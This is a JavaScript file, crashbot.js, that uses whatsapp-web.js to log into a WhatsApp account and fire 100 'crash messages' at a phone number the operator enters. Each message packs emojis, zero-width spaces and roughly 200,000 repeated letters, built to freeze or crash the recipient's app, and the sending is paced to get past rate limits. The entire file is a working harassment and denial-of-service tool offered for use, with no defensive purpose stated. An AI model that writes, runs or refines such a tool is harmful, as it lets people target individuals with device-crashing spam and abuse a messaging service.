// filename: crashbot.js

const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');

// Configuration for the WhatsApp client
const client = new Client({
    authStrategy: new LocalAuth(), // Stores session data locally
    puppeteer: {
    headless: false,
    executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    args: [
        '--no-first-run',
        '--disable-dev-shm-usage'
    ]
}
});

// --- Event Listeners ---

// On QR code generation, display it in the terminal
client.on('qr', qr => {
    console.log('Scan this QR code with your WhatsApp app:');
    qrcode.generate(qr, { small: true });
});

// When the client is ready and authenticated
client.on('ready', () => {
    console.log('WhatsApp Client is Ready!');
    console.log('-----------------------------------');
    console.log('Enter the recipient\'s phone number (with country code, e.g., 1234567890) and press Enter.');
    console.log('Then, press Enter again to start sending the crash messages.');

    // Prompt user for recipient number
    process.stdin.once('data', (data) => {
        const recipientNumber = data.toString().trim();
        // Ensure the number is in the correct format (e.g., '1234567890@c.us')
        const chatId = `${recipientNumber}@c.us`;

        console.log(`Targeting: ${recipientNumber}`);
        console.log('Press Enter to confirm and start sending crash messages...');

        // Wait for another Enter to confirm and start sending
        process.stdin.once('data', () => {
            console.log('Initiating crash message sequence...');
            sendCrashMessages(chatId, 100); // Send 100 crash messages
        });
    });
});

// Handle disconnected events (e.g., internet loss, phone disconnected)
client.on('disconnected', (reason) => {
    console.error('Client disconnected:', reason);
});

// Handle authentication failure
client.on('auth_failure', msg => {
    console.error('AUTHENTICATION FAILURE:', msg);
    console.log('Please delete the "session.json" file and try again.');
});

// --- Message Generation & Sending Functions ---

/**
 * Generates an extremely long and complex string designed to stress WhatsApp clients.
 * This can be customized for different types of "text bombs".
 * @returns {string} The generated crash message.
 */
function generateCrashMessage() {
    let message = '🐛💥'; // Starting with some emojis
    const repetitions = 5000; // Increase for a longer message
    const complexCharSet = '😂😭🥺💯🔥🤔💀🤯😴🤩🥳😎🤓🧐🤨🤪🥳😇🥰😍🤩🥳😎🤓🧐🤨🤪🥳😇🥰😍🤩🥳😎🤓🧐🤨🤪🥳😇🥰😍🤩🥳😎🤓🧐🤨🤪🥳😇🥰😍'; // A mix of complex emojis and unicode
    const invisibleChar = '\u200B'; // Zero-width space, can cause rendering issues

    // Repeat a complex pattern
    for (let i = 0; i < repetitions; i++) {
        message += complexCharSet;
        if (i % 10 === 0) { // Add invisible characters periodically
            message += invisibleChar.repeat(5);
        }
    }

    // Add a final very long string to ensure maximum length
    message += 'A'.repeat(50000); // Appending a massive string of regular chars
    message += 'B'.repeat(50000);
    message += 'C'.repeat(50000);
    message += 'D'.repeat(50000);

    return message;
}

/**
 * Sends a series of generated crash messages to a specified chat ID.
 * @param {string} chatId - The ID of the chat to send messages to (e.g., '1234567890@c.us').
 * @param {number} count - The number of crash messages to send.
 */
async function sendCrashMessages(chatId, count = 10) {
    const crashMessage = generateCrashMessage();
    console.log(`Generated crash message of length: ${crashMessage.length}`);

    for (let i = 0; i < count; i++) {
        try {
            console.log(`Sending crash message ${i + 1}/${count} to ${chatId}...`);
            await client.sendMessage(chatId, crashMessage);
            console.log(`Message ${i + 1} sent.`);
            await new Promise(resolve => setTimeout(resolve, 500)); // Small delay to avoid rate limiting
        } catch (error) {
            console.error(`Error sending message ${i + 1}:`, error.message);
            // Optionally, break or implement a retry mechanism
            await new Promise(resolve => setTimeout(resolve, 2000)); // Longer delay on error
        }
    }
    console.log('-----------------------------------');
    console.log(`Finished sending ${count} crash messages to ${chatId}.`);
    console.log('Bot will remain active. You can send more messages or close the terminal.');
}

// Initialize the WhatsApp client
client.initialize();